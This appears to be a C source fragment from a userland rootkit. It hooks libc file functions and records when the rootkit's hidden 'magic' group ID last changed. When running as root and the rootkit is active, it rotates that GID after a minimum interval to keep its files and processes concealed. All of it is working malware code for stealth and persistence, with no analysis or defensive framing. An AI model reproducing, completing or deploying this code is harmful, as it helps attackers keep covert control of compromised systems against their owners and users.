FILE *opengidtimepath(const char *mode){
    hook(CFOPEN);
    return call(CFOPEN, GIDTIME_PATH, mode);
}

int getlastchange(void){  // returns the time since the last change.
    int currentlast;
    FILE *fp;
    char timbuf[64];

    fp = opengidtimepath("r");
    if(fp == NULL){
        writelastchange(time(NULL));
        return getlastchange();
    }
    fgets(timbuf, sizeof(timbuf), fp);
    fclose(fp);

    currentlast = atoi(timbuf);
    return currentlast;
}

void writelastchange(int curtime){  // writes the *new* last change.
    FILE *fp;
    char timbuf[64];

    fp = opengidtimepath("w");
    if(fp == NULL) return;

    snprintf(timbuf, sizeof(timbuf), "%d", curtime);
    hook(CFWRITE);
    call(CFWRITE, timbuf, 1, strlen(timbuf), fp);
    fclose(fp);
}

int getlastchangediff(int curtime){  // returns the difference between the system's current time & time since last gid change.
    int lastchange = getlastchange();
    int diff = curtime - lastchange;
    return diff;
}

void gidchanger(void){  // changes the gid if the time since last change is >GID_CHANGE_MINTIME.
    gid_t magicgid = readgid();

    if(not_user(0) || rknomore() || getgid() == magicgid || rkprocup())
        return;

    int curtime = time(NULL);
    if(getlastchangediff(curtime) <= GID_CHANGE_MINTIME)
        return;

    if(changerkgid() < 0) return;
    writelastchange(curtime);
}